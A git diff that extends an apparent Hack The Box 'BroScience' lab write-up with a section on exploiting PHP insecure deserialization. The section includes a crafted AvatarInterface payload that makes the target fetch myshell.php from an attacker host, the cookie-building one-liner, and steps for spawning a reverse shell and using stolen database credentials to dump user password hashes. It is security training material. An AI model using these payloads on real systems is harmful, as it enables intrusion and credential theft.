@@ -111,13 +111,52 @@ Once got the activation code, we call *activate.php* and we insert the token in 
 
 ![activate-account](/images/htb_broscience/img3.png)
 
-Now we can log in to our account with the username and password we insterted.
+Then, we can log in to our account with the username and password we insterted.
 
 ---
 
-## Insecure deserialization
+## Insecure deserialization + Reverse shell
 
-TO FINISH
+Now that we are logged in the web app, we can, for example, post new comments or change the color the page. However, the very first characteristic that caught my attention was the *user-prefs* cookie that has been set.
+
+![user-prefs-cookie](/images/htb_broscience/img4.png)
+
+It is a base64-serialized PHP object. So, analyzing the php code we retrieved before, we note that inside /includes/utils.php there is an *AvatarInterface* class, whose \_\_wakeUp() function creates a new *Avatar* instance and saves it in a path.
+Then, by creating a custom AvatarInterface that calls a server we are hosting, request an arbitrary file we have and saves it in the target webserver, then we could think of requesting such file.
+
+Specifically, if AvatarInterface is defined in this way:
+
+```
+class AvatarInterface {
+    public $tmp = "http://<IP>:<port>/myshell.php";
+    public $imgPath = "./myshell.php";
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}
+```
+
+we are setting the path to a server we own and with a file (myshell.php), which will become handy for creating a reverse shell.
+
+Indeed, if we echo a serialized AvatarInterface object (```echo urlencode(base64_encode(serialize(new AvatarInterface)));```), we put the result in the *user-prefs* cookie, we launch our server and then we make the request with the fresh cookie, then, if all is ok, our server will receive a request for myshell.php.
+
+Next, create a new server which is going to listen to the port set in AvatarInterface, call *https://broscience.htb/myshell.php* et voila' - a rev shell will spawn.
+
+![rev-shell](/images/htb_broscience/img8.png)
+
+Great! Now, do your remind that we found a *db_connect.php* file inside /includes? Very good, in there we can find the credentials for a postgre database, let's use them:
+
+```
+psql -h localhost -U <user> -p <port> -d <DB>
+```
+
+Once connected, we list the tables and find the *users* table. Querying it we retrieve all the registered users with relative hash passwords. 
+
+![db](/images/htb_broscience/img7.png)
+
+
 
 
 
